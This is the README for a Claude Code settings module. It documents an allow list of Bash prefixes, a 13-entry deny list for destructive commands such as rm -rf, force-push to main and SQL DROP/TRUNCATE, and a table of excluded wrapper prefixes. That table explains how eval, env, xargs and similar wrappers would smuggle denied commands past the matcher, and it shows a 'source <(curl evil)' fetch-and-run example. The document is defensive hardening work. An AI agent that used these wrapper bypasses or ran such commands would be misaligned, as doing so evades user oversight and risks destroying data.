# settings

Base settings.json with comprehensive tool permissions (800+ allow entries), deny list for dangerous operations, and plugin configuration.

## What It Does

This module provides a `settings.base.json` that gets merged into `~/.claude/settings.json`. It includes:

- **Allow list**: ~800 Bash command prefixes covering git, package managers, build tools, languages, editors, system utilities, cloud CLIs, databases, and more. Privilege-escalation / arbitrary-execution prefixes (`sudo`, `su`, `doas`, `eval`, `exec`) and command-wrapper prefixes that run an arbitrary following command (`command`, `source`, `.`, `builtin`, `env`, `xargs`, `nohup`, `timeout`, `watch`, `nice`, `time`, `parallel`, `caffeinate`) are deliberately **excluded** — see "Excluded from the allow list" below.
- **File operation permissions**: Read/Edit/Write permissions for your code directory, Claude config, and temp files
- **Deny list**: 13 entries for dangerous operations (rm -rf, force push to main, docker rm, DROP/TRUNCATE/DELETE SQL). Several legacy entries were pruned in #474 once the `hooks` module gained bypass-proof `hard_block()` enforcement — see "Deny list rationale" below.
- **Tool permissions**: WebFetch, WebSearch, Skill, Glob, Grep, and Supabase MCP tools pre-approved
- **Plugin configuration**: Common Claude Code plugins enabled

### Deny list rationale (13 entries)

Each entry survives a specific test: would removing it create a real new risk after Epic 1 of #473 wired `hooks/check-careful.py`, `hooks/enforce-git-workflow.py`, `hooks/auto-approve-bash.py`, and `hooks/check-migration-timestamps.py` to use `hook_utils.hard_block()` (bypass-proof `exit 2`)?

- `Bash(rm -rf:*)` / `Bash(rm -r:*)` — paired-with `check-careful.py` which prompts in non-bypass mode and short-circuits in bypass. Deny is the belt to the hook's suspenders for the bypass-mode case where the hook intentionally stays silent.
- `Bash(git reset --hard:*)` — `auto-approve-bash.py` smart-rule hard-blocks the non-remote-ref form and explicitly allows the remote-ref form. The deny entry catches anything the smart-rule misses.
- `Bash(git push --force origin main:*)` — kept as a single canonical deny. The variant forms (`-f main`, `--force main`, `--force-with-lease origin main`, `-f origin main`) were pruned because `check-careful.py:_is_force_push_to_main()` matches all of them and hard-blocks; the surviving deny is defense-in-depth for the most-typed form.
- `Bash(git clean:*)` — `check-careful.py` prompts. Deny matters in bypass + no `ALLOW_MAIN_COMMIT` flow.
- `Bash(git branch -D:*)` — no hook covers branch deletion.
- `Bash(docker rm:*)`, `Bash(docker rmi:*)`, `Bash(docker system prune:*)` — hook only fires for `-f` variants; deny catches the bare forms.
- `Bash(kubectl delete:*)`, `Bash(DROP:*)`, `Bash(TRUNCATE:*)`, `Bash(DELETE FROM:*)` — SQL/k8s blast radius. Hooks ask but deny is the harder stop in non-bypass.

Removed in #474 (now redundant with hook hard-blocks):
- `Bash(git push --force main:*)`, `Bash(git push -f main:*)`, `Bash(git push --force-with-lease origin main:*)`, `Bash(git push -f origin main:*)` — all subsumed by `check-careful.py:_is_force_push_to_main()`.

### Excluded from the allow list (#665, #711)

The allow list intentionally does **not** grant these prefixes:

| Excluded prefix | Why it is dangerous to auto-allow |
|-----------------|-----------------------------------|
| `Bash(sudo:*)`, `Bash(su:*)`, `Bash(doas:*)` | Privilege escalation. An auto-approved `sudo` runs *anything* as root, sidestepping every per-command guard. |
| `Bash(eval:*)`, `Bash(exec:*)` | Arbitrary execution. The permission matcher only sees the literal prefix (`eval`, `exec`), so `eval "rm -rf /"` would be auto-approved even though `Bash(rm -rf:*)` is on the deny list. These prefixes defeat both the deny list and every argument-pattern allow rule. |
| `Bash(command:*)`, `Bash(builtin:*)` | Same matcher-bypass class as `eval`/`exec`. `command rm -rf x` and `builtin eval "rm -rf /"` run the denied command — the matcher only ever sees the wrapper word. |
| `Bash(source:*)`, `Bash(.:*)` | Run arbitrary script from a file or process substitution (`source <(curl evil)`, `. <(...)`). Whatever the sourced script does is never seen by the matcher. `.` is the POSIX synonym for `source` and carries the identical risk. |
| `Bash(env:*)`, `Bash(xargs:*)`, `Bash(nohup:*)`, `Bash(timeout:*)`, `Bash(watch:*)`, `Bash(nice:*)`, `Bash(time:*)`, `Bash(parallel:*)`, `Bash(caffeinate:*)` | Command wrappers: each takes a following command and runs it. `env rm -rf x`, `timeout 5 rm -rf x`, `xargs rm -rf <<< x`, `nohup rm -rf x`, etc. all slip a denied command past the prefix matcher. |

#665 removed the privilege-escalation / arbitrary-execution prefixes; #711 removed the remaining command-wrapper prefixes. The deny list takes precedence over the allow list in Claude Code's permission model, but it can only override commands it actually names — every prefix above lets a caller smuggle a denied command past the matcher entirely, so the only safe fix is to keep them off the allow list. With these prefixes excluded, such commands fall through to `defaultMode` (`ask`) and prompt for approval.

**Intentionally kept** (NOT excluded): ordinary builtins that do not take a command argument (`let`, `enable`, `set`, `export`, `printenv`, `renice`, `:`, `test`) stay allowed. `find` is kept despite `-exec` because it is a core read-only utility whose normal use does not run commands, and `ssh` is kept because it executes on a remote host, not against the local deny list. These do not function as local matcher-bypass wrappers.

## Template Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `__DEFAULT_MODE__` | Permission mode for unmatched commands (`ask` or `dontAsk`) | `ask` |
| `__HOME__` | Home directory path (replaced during installation) | System $HOME |
| `__CODE_DIR__` | Path to your code directory | `$HOME/code` |

## Manual Installation

```bash
# 1. Copy the base settings
mkdir -p ~/.claude
cp settings.base.json ~/.claude/settings.json

# 2. Replace template variables
# Edit ~/.claude/settings.json and replace:
#   __DEFAULT_MODE__ -> ask (or dontAsk)
#   __HOME__ -> your home directory path (e.g., /Users/yourname)
#   __CODE_DIR__ -> your code directory (e.g., /Users/yourname/code)
```

## Security Notes

- **Default mode is `ask`**: Unrecognized commands will prompt for approval. Change to `dontAsk` only if you trust Claude to run any command.
- The deny list blocks destructive operations even in `dontAsk` mode.
- `skipDangerousModePermissionPrompt` is NOT included - you will be warned when switching to dangerous mode.

## Files

| File | Description |
|------|-------------|
| `settings.base.json` | Complete settings.json template with all permissions |

## Maintaining the Allow List

The `settings.base.json` allow list is a static, hand-curated baseline. To extend it for commands you actually run, use Claude Code's built-in `/less-permission-prompts` skill:

> "Scan your transcripts for common read-only Bash and MCP tool calls, then add a prioritized allowlist to project `.claude/settings.json` to reduce permission prompts."

Run `/less-permission-prompts` in any project to generate a project-local `.claude/settings.json` with allowlist additions derived from your session history. If patterns from a project-local file turn out to be universal across your work, promote them into this module's `settings.base.json` via a PR.

### Evaluation: CE claude-permissions-optimizer (issue #285)

EveryInc/compound-engineering-plugin previously shipped a `claude-permissions-optimizer` skill with similar goals (scan session history, classify commands, write allowlist entries). As of CE PR #578/#583 the skill was **removed from CE** and the CHANGELOG states: "drop skill in favor of `/less-permission-prompts`". CE's authors explicitly adopted Anthropic's first-party built-in as the recommended path.

**CCGM action**: none required. CCGM does not ship a permissions-optimizer skill (the `settings` module ships only a static allow list), and the CE version is no longer maintained. Users rely on the Anthropic-shipped `/less-permission-prompts` skill for dynamic allowlist additions. The transferable pipeline-design lessons from CE's defunct skill (ordering of filter / normalize / group / threshold / re-classify) are captured in their `docs/solutions/skill-design/claude-permissions-optimizer-classification-fix.md` if a future CCGM-native optimizer is ever written; they are not re-documented here to avoid duplicating upstream content.
